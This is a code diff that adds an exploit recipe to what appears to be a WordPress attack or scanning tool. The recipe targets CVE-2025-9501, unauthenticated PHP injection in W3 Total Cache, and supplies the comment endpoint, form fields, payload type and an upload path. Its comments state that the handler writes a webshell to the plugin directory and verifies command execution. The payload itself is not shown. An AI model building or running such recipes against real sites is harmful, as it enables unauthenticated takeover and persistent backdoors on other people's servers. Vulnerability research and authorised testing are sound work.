@@ -201,6 +201,36 @@ RECIPES = [
                 "from source; advertised fix version (51.1.37) may overstate "
                 "the true vulnerable range.",
     },
+    {
+        "plugin": "w3-total-cache",
+        "cve": "CVE-2025-9501",
+        "affected": "<2.8.13",
+        "mode": "w3-comment-injection",
+        "method": "POST",
+        "endpoint": "/wp-comments-post.php",
+        "params": {"post_id": 1},
+        "comment_field": "comment",
+        "author_field": "author",
+        "email_field": "email",
+        "upload_path": "/wp-content/plugins/w3-total-cache/{filename}",
+        "payload_type": "eval-injection",
+        "source": "registry",
+        # CVE-2025-9501: W3 Total Cache _parse_dynamic_mfunc() command injection.
+        # The plugin's fragment/object cache processing improperly handles comment
+        # content submitted via wp-comments-post.php, allowing unauthenticated
+        # attacker to inject arbitrary PHP code through the comment mechanism.
+        # When W3TC processes the cache payload, the injected code is evaluated,
+        # allowing direct PHP execution and arbitrary file writes. The handler
+        # crafts a payload that exploits this to write a webshell to the plugin
+        # directory, then verifies command execution.
+        "note": "Unauth PHP command injection (CVE-2025-9501, W3 Total Cache "
+                "<2.8.13): _parse_dynamic_mfunc() improperly processes comment "
+                "content, allowing arbitrary PHP eval through the cache layer. "
+                "Payload submitted via wp-comments-post.php exploits dynamic "
+                "mfunc parsing to write and execute arbitrary PHP. No auth, no "
+                "nonce required; unauthenticated users can submit comments and "
+                "trigger payload evaluation.",
+    },
 ]
 
 
